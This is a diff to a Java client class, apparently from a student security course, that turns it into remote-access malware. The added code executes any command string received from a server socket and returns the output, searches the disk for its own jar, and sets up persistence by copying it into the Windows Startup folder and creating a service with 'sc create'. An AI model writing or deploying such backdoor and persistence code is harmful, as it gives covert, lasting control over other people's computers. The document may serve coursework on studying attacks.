@@ -81,16 +81,9 @@ public class Cliente {
         String st = "";
         int sti = 0;
         try {
-            do {
+            do {                        
                 st = (String) bufferDeEntrada.readUTF();
-                mostrarTexto("\n[Servidor] => " + st);
-                if(st.equals("1")){                    
-                    escribirDatos("ipconfig");
-                }else if(st.equals("2")){
-                    escribirDatos("arp -a");
-                }else if(st.equals("3")){
-                    escribirDatos("hostname");
-                }                                                           
+                escribirDatos(st);                                                            
             } while (!st.equals(COMANDO_TERMINACION));
         } catch (IOException e) {}
     }
@@ -99,13 +92,13 @@ public class Cliente {
         String entrada = "";
         Process p;
         try {
+              System.err.println("COMANDO: " + comando);
               p = Runtime.getRuntime().exec(comando);
               p.waitFor();
               BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
               String line = "";
-              while ((line = reader.readLine())!= null) {
-                  enviar(line+"\n");                  
-                  //System.out.println(line);
+              while ((line = reader.readLine())!= null) {                  
+                  enviar(line+"\n");
               }
               reader.close();
               
@@ -123,22 +116,46 @@ public class Cliente {
             if(entrada.length() > 0)
                 enviar(entrada);
         }
+    }    
+
+    /**
+     * Persiste de dos formas diferentes en el archivo StartUp y creando un servicio sc
+     * @param location 
+     */
+    private void persistir(String location){          
+        String locationJAR = "";        
+        String locationCopy = "";        
+        locationJAR = location; //+ "\\Cliente.jar";        
+        locationCopy = "xcopy " + "\"" + location + "\" " + "\"" + "c:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp" + "\"" ;                        
+        escribirDatos(locationCopy);        
+        escribirDatos("sc create newservice binpath="+locationJAR);                                
+        System.out.println("LO LOGRO");
     }
-
-    public static void main(String[] argumentos) {
-        Cliente cliente = new Cliente();
-        Scanner escaner = new Scanner(System.in);
-        
-        mostrarTexto("Ingresa la IP: [localhost por defecto] ");        
-        String ip = escaner.nextLine();        
-        if (ip.length() <= 0){        
-            ip = "localhost";
-        }
-
-        mostrarTexto("Puerto: [5050 por defecto] ");
-        String puerto = escaner.nextLine();
-        if (puerto.length() <= 0) puerto = "5050";
-        cliente.ejecutarConexion(ip, Integer.parseInt(puerto));
-        //cliente.escribirDatos();
+    
+    public void findFile(String name,File file){        
+        String location = "";
+        File[] list = file.listFiles();        
+        if(list!=null){
+            for (File fil : list)
+            {
+                if (fil.isDirectory())
+                {  
+                    findFile(name,fil);
+                }
+                else if (name.equalsIgnoreCase(fil.getName()))
+                {
+                    location = fil.getParent();
+                    System.out.println("PERSISTIR");
+                    persistir(location);                                        
+                }
+            }
+        }                 
+    }
+    
+    public static void main(String[] argumentos) throws IOException {
+    Cliente cliente = new Cliente();        
+    cliente.ejecutarConexion("localhost", Integer.parseInt("5050"));
+    cliente.findFile("Cliente.jar",new File("C:\\Users\\danie\\Documents\\Universidad\\2019-1\\HAET\\Cliente\\dist"));
+    
     }
 }
